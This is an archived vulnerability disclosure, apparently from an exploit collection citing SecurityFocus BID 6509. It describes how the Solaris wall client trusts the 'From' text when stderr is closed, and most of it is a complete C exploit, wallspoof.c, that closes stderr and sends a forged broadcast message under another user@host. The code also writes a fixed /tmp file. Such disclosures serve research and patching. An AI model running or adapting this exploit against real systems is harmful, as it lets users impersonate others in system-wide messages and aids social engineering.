source: http://www.securityfocus.com/bid/6509/info

Solaris is the freely available UNIX Operating System variant distributed by Sun Microsystems.

The wall client packaged with Solaris makes assumptions about a user's environment when the client is executed. The assumption is made that if the file descriptor of stderr points to a tty when wall is executed, the user is local. If not, the user is considered remote, and the first five bytes of the
supplied 'From' text will be used by wall as the users idenfitication. This makes it possible for a user to close stderr prior to the execution of wall, and send a spoofed message using the client. 

/*
 wallspoof.c - SOLARIS (X86/SPARC) Exploit
 Don't use this in a malicious way! (i.e. to own people)
 */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
  char *userhost;
  char mesg[2050];
  FILE *tmp;
  if (argc < 2) {
    fprintf (stderr, "usage: wallspoof user@host\n");
    exit (-1);
  }
  userhost = argv[1];
  if ((tmp = fopen("/tmp/rxax", "w")) == NULL) {
    perror ("open");
    exit (-1);
  }
  printf ("Enter your message below.  End your message with an EOF (Control+D).\n");
  fprintf (tmp, "From %s:", userhost);
  while (fgets(mesg, 2050, stdin) != NULL)
    fprintf (tmp, "%s", mesg);
  fclose (tmp);
  fclose (stderr);
  printf ("<Done>\n");
  system ("/usr/sbin/wall < /tmp/rxax");
  unlink ("/tmp/rxax");
}
